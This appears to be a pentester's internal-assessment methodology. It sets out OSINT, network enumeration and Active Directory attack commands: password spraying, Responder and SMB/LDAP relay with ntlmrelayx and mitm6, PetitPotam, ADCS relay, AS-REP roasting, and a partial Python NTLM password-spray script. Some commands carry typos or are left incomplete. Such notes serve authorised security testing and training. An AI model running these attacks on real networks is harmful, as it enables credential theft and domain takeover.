# Internal Pentesting

**This is done in phases**
#### Phase 0: Initial Enumeration
- Domain information
- Data disclosures
- Breach data
#### Phase 1: In Network
- Initial enumerations uncredentialed in a network
1. Enumerate the network
2. Identify Valid Credentials by configuration and attack
3. Port and Protocol Attacks
- In network with Username and Password
1. Enumerate Network
2. Identify Access
3. Attacks
#### Phase 2:On Device
- Low Level User
- Windows Priv Esc
- Admin Low Level
#### Phase 3: Privilege User Access
- Domain Administrator in Network
- Domain Administrator on Host

# Phase 0: OSINT
<details>
  <summary>
    Summary
  </summary>
  The purpose of external recon on day 1 of your internal assessment is to identify information that may help with your attack. This info may include
</details>

1. Domain information
2. Data disclosures
3. Breach data



### Domain Info
#### ASN/IP Registrars
	IANA
	arin
	RIOE
	BGP Toolkit
	Domaintools
	PTRArchive
	ICANN
	Manual
	DNS: Viewdns.info  

### Data Disclosures
<details>
  <summary>
    The Corporate Website
  </summary>
   	We want to see if we can find any information disclosures here that identify user information, internal contact information or anything useful (job postings for technology).
</details>

#### Github
 	https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt, 
	Look for this company specifically, try to find anything associated that may give hint to passwords, keys, secrets, technology or accounts.

### Google Dorking
<details>
  <summary>
    Summary
  </summary>
	We want to use Google dorking to find any internal documents or listings on the website that mays elude to usernames, passwords, internal contact information, domain names etc. For example, I once found an entire internal network topology map publically available.
</details>

#### Find emails: 
	intext:'@website.com" inurl:website.com

#### Find files: filetype:
	pdf inurl: website.com

<details>
  <summary>
    Job postings
  </summary>
  Head to glassdoor, indeed, monster, etc. Look for job postings to find roles, technology, software, etc. Look for anything that we could exploit.
</details>

### User Identification/Social Media
<details>
  <summary>
    Summary
  </summary>
  The purpose is to build a userlist we can use to password spray or attack with internally.
</details>

#### User Osint to build a list
	https://phonebook.cz
	https://whatsmyname.app/
	https://hunter.io/
#### Social Media
	LinkedIn.com https://github.com/initstring/linkedin2username
	Facebook
	Twitter

### Breached Data
<details>
  <summary>
    Summary
  </summary>
  The purpose is to build a userlist we can use to password spray or attack with internally.
</details>

#### Leaked Credentials
	dehashed.com - sudo python3 dehashed.py -q inlanefreight.local -p  
	breach-parse
	HaveIBeenPwned


# Phase 1: In Network
## Initial Enumeration
<details>
  <summary>
    Summary
  </summary>
  We want to find all alive hosts through ping, then NMAP them for all ports. Identify the domain name, located the DC and take screenshots of any web pages.This stage is to identify the network itself. We may also be able to use enum4linux if its misconfigured without credentials.
</details>

### Identify all living hosts
#### FPING Ping the network
	CMD: fping -asgq X.X.X.X/24
Copy this into a text file for NMAP

### Scan all living hosts for ports
	nmap -A  -v  -iL <IP FILE> -oA <EXPORT PATH>
	nmap -sV -sC -Pn X.X.X.X
 Identify everything to review if needed

### (Optional) Identify critical ports (low hanging fruit scan)
	nmap -A -p  21,22,23,25,139,53,80,137, 443,445, 8080, 8443,69 -iL <IP FILE>

### Parse out the data from your NMAP scan
	./Gnmap-Parser.sh --p <nmap file>
 
Run GNMAP-Parser
Run parse function 

### Find the AD/DC
	nmap -p 389,636,53,88 X.X.X.X
	ldapsearch -x -h <ip> -s base
	nmap -n -sV --script"ldap" and not brute -p 389 <DC-IP>

### Take a screenshot of all websites, dont forget for any uncommon ports or 8080,8443
	Eyewitness Port 80,443
	eyewitness --web -f <nmap IP file>
	Subdomain Busting on any internal websites

### Find the Domain
	Crackmapexec smb X.X.X.X

### Find all Hostnames
	Crackmapexec smb X.X.X.X/24

### DNS Zone Transfer
	dig axfr  <Domain_name> @name_server

### Wireshark/ TCP Dump
	sudo tcpdump -i ens224   
<details>
  <summary>
    Summary
  </summary>
  Sitting in the network we can start to pick up some pieces of information by performing a packet capture. We can find other hosts, hostnames, etc. Use TCPdump to capture the traffic and export it to a Wireshark file.
</details>

### Active Directory Enumeration
<details>
  <summary>
    Summary
  </summary>
   If AD is not properly configured, an unauthenticated user can enumerate users, password policies, group memberships, shares and more. We can use this to identify a lot of sensitive information about a network.
</details>

#### Identify AD Information
 	Password Policy1 - enum4linux -P x.x.x.x >> export path  
	 Password Policy2 - crackmapexe <IP> -u "user" -p "password" --pass-pol
	 Groups with members - enum4linux -M x.x.x.x >> export path  
 	Shares Discovery - enum4linux -S x.x.x.x >> export path  
 	Scan for All enum4linux -a X.X.X.X >> ./ADdiscovery.txt

 ### Petipotam
 	petitpotam.py -d <domain> <listenter_ip> <target_ip>
You can attempt this without credentials if its poorly configured
If it states connected, successfully bound. Then something went wrong, this was successful. 

### ADCS Verification (uncredentialed attempt)
	certutil.exe to identify if the domain is using a certificate authority.
Then http://CertificateServer/certsrv

We will run an ntlmrelayx attack against the server
	ntlmrelayx.py -t http://CertificateServer/certsrv -smb2support --adcs --template DomainController
	
# Phase 1: In the Network
## Identifying Valid Credentials
<details>
  <summary>
    Summary
  </summary>
The key here is we may be able to guess or build users. We can attack printers to find usernames or attempt to login to network equipments with defaults to find credentials. Some ports and protocols like SMB may also give us credentials.
</details>

## Glossary
1. Enumeration by Configuration
- Finding users through RPC, LDAP, RID, NMAP
- Default Credentials
- Breached Credentials
- Overpermissive AD
- Password Sprays
2. Enumeration by Attack
- Responder
- MITM6
- WPA attacks/wireless attacks
- Printers

## Enumeration by Configuration
### Find Domain Users without Credentials
	enum4 linux -U X.X.X.X
	RPCCLIENT USER SEARCH: rpcclient -U "" X.X.X.X
	Then enumdomusers

#### LDAP enumeration
	ldapsearch -x -h X.X.X.X -b base namingcontext

#### RID -Impacket
	impacket-lookupsid DOMAIN/guest@X,X,X,X

#### NMAP Attempt
	nmap -p 88 --script=krb5-enum-users --script args="krb5-enum-users.realm='<DOMAIN>'.userdb=<user_list_file> <IP>

### Default Credentials
	https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
	https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

### Overpermissive AD
	AD Users > enum4linux -U x.x.x.x   | grep 'user'  OR   >> export path  
	Machine list > enum4linux -M x.x.x.x >> export path  

## WE HAVE A USERLIST
<details>
  <summary>
    Summary
  </summary>
  Once we have a username list we can use kerbrute to validate they exist. Any of the above methods may spit out valid accounts as well. All of these suggest a guest/anony can identify accounts
</details>


#### Kerbrute
<details>
  <summary>
    Summary
  </summary>
  Need to put some more explanation here, eventually
</details>

#### Installing
	git clone it
	make all
	add the tool to your path
	echo $PATH
	sudo mv kerbrute /path/
#### Enumerating
	kerbrute userenum -d DOMAIN.com --dc X.X.X.X username.txt -o validUsers
	./kerbrute_linux_amd64 passwordspray -d <DOMAIN.com> <username file> <single password to test>
	anything returned PRINCIPAL UNKNOWN isnt a legit account stealthy too.

## Password Attacks
<details>
  <summary>
    Summary
  </summary>
  The preferred method here is to take our users found and look for valid passwords. If we discovered the password policy in phase 1 then we know how frequent our tests can be. I often will use my userlist and test it with a single password twice every 30 to 45 minutes. You can lock one user out to verify but be careful with this. When you find a valid user and password combo, you can then throw the credentials across the network. When password spraying I often choose a simpe desktop IP address as any standard user should have access to it. SEE TECHNIQUES PASSWORDS UNDER SPECIFIC TECHNIQUES
</details>

#### Techniques
	enum4linux -u "User:" -p "password" -P <IP>
	You can test this against a user by locking out with crackmapexec
	crackmapexec smb <IP> -u USERNAME -p <doesnt matter> -d <domain>  
	cme smb <dc-IP -u user.txt -p password.txt --no-bruteforce
	cme smb <dc-ip> -u user.txt -p password.txt (only use if no lockout policy)
	crackmapexec smb <dc-ip> -u user.txt -p "PASSWORD" -d <domain> (use this to test single passwords)
	You can test this against a user by locking out with crackmapexec

Note the amount of failed attempts to lock out and then time the reset, wait for 30 minutes first and then increment to 1 hour. This is tedious and is used if other methods dont work.

#### Python NTLM Password Spray
<details>
  <summary>
    Summary
  </summary>
  This is a brute forcing tool for any internal website that allows for Windows authentication. It performs password stuffing against websites that are federated with the kerberos network.
</details>

#### How To use this
	Name it ntlm_passwordspray.py
	python ntlm_passwordspray.py -u <USERNAMEFILE> -f <FQDN of organization were attacking> -p <SINGLE PASSWORD> -a <the URL of the application that supports windows authentication
	EXAMPLE:python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a   
	def password_spray(self, password, url): 
	print ("[*] Starting passwords spray attack using the following password: " + password)
	#Reset valid credential counter 
	count = 0 
	#Iterate through all of the possible usernames 
	for user in self.users: 
	#Make a request to the website and attempt Windows Authentication 
	response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password)) 
	#Read status code of response to determine if authentication was successful 
	if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): 
	print ("[+] Valid credential pair found! Username: " + user + " Password: " + password) 
	count += 1 
	continue 
	if (self.verbose): 
	if (response.status_code == self.HTTP_AUTH_FAILED_CODE): 
	print ("[-] Failed login with Username: " + user) 
	print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")   

## Enumeration by Attack
- Responder
- MITM6
- WPA attacks/wireless attacks
- Printers

### LLMNR, NBT-NS, WPAD Attack
<details>
  <summary>
    Summary
  </summary>
  We want to run this attack during primary times of logins etc, we like to focus when the admins/users login around the morning wave, the lunch return times as well. NOTE: you can't run Mitm6 and responder at the same time, they use the same ports and cant run together.Computer trys to connect to a server but the user sends something wrong sending a DNS issues so the server says what are you talking about? So broadcast message is sent to everyone to see if anyone knows who this weird guy is. You MiTm this and say I do send me your hash and I will. We use responder, this should run first thing in the morning or right after lunch. You need a lot of traffic. Key flaw, when you respond to this, it responds back to you with a username and password hash. Example of an event: Someone types in the wrong network drive. Once this happens, an event occurs and we will see the username and NTLM hash. EASY TERMS: Okay so kali is in the environment and your are listening on responder. When a windows computer tries to access your IP address for a share or something, responder captures the username and hash. 
</details>

#### Running Responder
	responder –I INTERFACE(ETHO) -v -w


### SMB Relay With Responder
<details>
  <summary>
    Summary
  </summary>
  Take the hashes we get from responder and forward them, SMB signing has to be enabled because it’s a packet level protocol. If siginig is disabled then it  never checks for authentication of the user and hash.User being relayed has to have admin creds on the target machine 
</details>

#### Configuring
	Go into responder config file
	vim /opt/responder/Responder.Conf
	vim /etc/responder/Responder.conf
	Turn off smb and http 
	Means we capture these but we use another tool to relay 
	Launch responder 

#### Validate SMB Signing is disabled to run SMB Relay
	NMAP CMD: nmap -p 445 --script=smb2-security-mode X.X.X.X
	NMAP CMD: nmap -p 139--script=smb2-security-mode X.X.X.X

####  Attack for SMBrelay
	impacket-Ntlmrelayx.py -tf targets.txt -smb2support
	Nc 127.0.0.1 11000 
	impacket-Ntlmrelayx.py --add-computer   usually gives initial access.

- Now we just wait for an event, if an admin, it will dump the sam files for the local users. 
- We get hashes from the sam and will try to laterally move 
- Will attempt for an interactive shell and say if it worked, open a new tab 
- We are in an smb shell essentially, so start listing to find items 
- Try use ADMIN$ to get into system32 
- You could do a metasploit shell with multihandler using the ntlmrelayx 
- EASY TERMS: You take the hashing if SMB signing is disabled, you attempt to relay the smb authentication. We user responder to capture and then relay to attack. - 

### MITM6
<details>
  <summary>
    Summary
  </summary>
  On a seperate machine run this, they cant run on the same device
</details>

#### Attack
	Mitm6 –d DOMAIN 
	Replies start coming in 
	
#### Relay attack 
	Ntlmrelayx.py -6 –t ldaps://IP of DC –wh fakewpad.DOMAIN -l text.txt 
	Running this 
	Start enumerating entire AD 
#### This will add a user and password as an admin
	mitm6 -d <domain>
	ntlmrelayx.py -6 -wh <attackerIP> -; /tmp - socks -debug
	ntlmrelayx.py -6 -wh <attackerIP> -t smb://<target> -l /tmp -socks -debug
	ntlmrelayx.py -t ldaps://<dc IP> -wh <attacker_ip> --delegate-access
	If any of these work
	(impacket) ./getST.py -spn cifts/<target> <domain>/<netbios Name>\$ -impersonate <user>

### Wireless Attacks/WPA Ehh
 SECTION UNDER WORK. The main goal with our testing is to identify if I can move to sensitive areas from wireless areas.
 
#### Evil Twin
 Copy the current wifi that are nearby, we need to discover the other Wifi's password
3 Factors in play
1. A target connected to a wireless network, the victim connects to an AP which connects to the network. We add a MITM situation to terminate this connection to force them to go through us. The whole point is we want to steal the wireless password.
2. Create the fake network
3. Convince users to move them to new network
- when they try to reconnect, they should see the other wifi and login without a password. When they go to this page, it should then auto populate a fake webpage asking for credentials to login.

### Printers
<details>
  <summary>
    Summary
  </summary>
  Here
</details>

#### Responder Passback Attacks  (LDAP Attack)
- Netcat and responder can do this 
- Printer based attack where you send the password back to your machine instead of the DC by setting the LDAPs to you. 
- Printers who scan from printer to computers, the user in the platform is usually a domain admin and dump the creds with the passback attack. PRINTERS ARE A HUGE ATTACK vector. 
- Jenkins is often wide open for a shell 

#### Printer Usernames
- Printers often have default configs which means we can gain access to them using default credentials. I will leverage this to identify valid usernames.

#### ASREP
 	impacket-GetNPUsers DOMAIN/ -no-pass -userfile USERNAMES.txt
 	*Add the domain name to your hosts file to be safe.
    	Once you get this, you can attempt to crack the hash offline
Possible roastable meaning user didnt need creds to request a TGT from the KDC.
